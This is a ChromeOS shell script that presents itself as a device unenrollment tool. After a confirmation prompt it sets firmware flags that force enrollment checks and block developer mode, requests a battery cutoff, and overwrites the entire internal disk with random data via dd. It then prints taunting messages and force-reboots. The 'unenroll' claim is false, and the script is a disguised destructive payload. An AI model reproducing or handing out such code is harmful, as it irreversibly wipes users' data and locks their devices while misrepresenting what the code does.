SCRIPT_DATE="[2025-9-19]"

fail() {
    printf "%b\n" "$*" >&2
    exit 1
}

get_largest_cros_blockdev() {
    local largest size dev_name tmp_size remo
    size=0
    for blockdev in /sys/block/*; do
        dev_name="${blockdev##*/}"
        echo "$dev_name" | grep -q '^\(loop\|ram\)' && continue
        tmp_size=$(cat "$blockdev"/size)
        remo=$(cat "$blockdev"/removable)
        if [ "$tmp_size" -gt "$size" ] && [ "${remo:-0}" -eq 0 ]; then
            case "$(sfdisk -d "/dev/$dev_name" 2>/dev/null)" in
                *'name="STATE"'*'name="KERN-A"'*'name="ROOT-A"'*)
                    largest="/dev/$dev_name"
                    size="$tmp_size"
                    ;;
            esac
        fi
    done
    echo "$largest"
}

format_part_number() {
    echo -n "$1"
    echo "$1" | grep -q '[0-9]$' && echo -n p
    echo "$2"
}

CROS_DEV="$(get_largest_cros_blockdev)"
[ -z "$CROS_DEV" ] && fail "No CrOS SSD found on device!"

echo "no name yet."
echo "script date: ${SCRIPT_DATE}"
echo ""
echo "This will destroy all data on ${CROS_DEV} and unenroll the device."

echo "Continue? (y/N)"
read -r action
case "$action" in
    [yY]) : ;;
    *) fail "Abort." ;;
esac

# if youre reading this then good job, Youre not a skid. 

crossystem battery_cutoff_request=1
vpd -i RW_VPD -s check_enrollment=1
vpd -i RW_VPD -s block_devmode=1
crossystem block_devmode=1

sleep 2

dd if=/dev/random of="${CROS_DEV}" bs=1M status=progress

if [ $? -eq 0 ]; then
    clear
    echo "That was a bad idea."
    sleep 2
    echo "You ran this without looking at what it does."
    sleep 1
    echo "have fun"
    reboot -f
else
    fail "Error."
fi
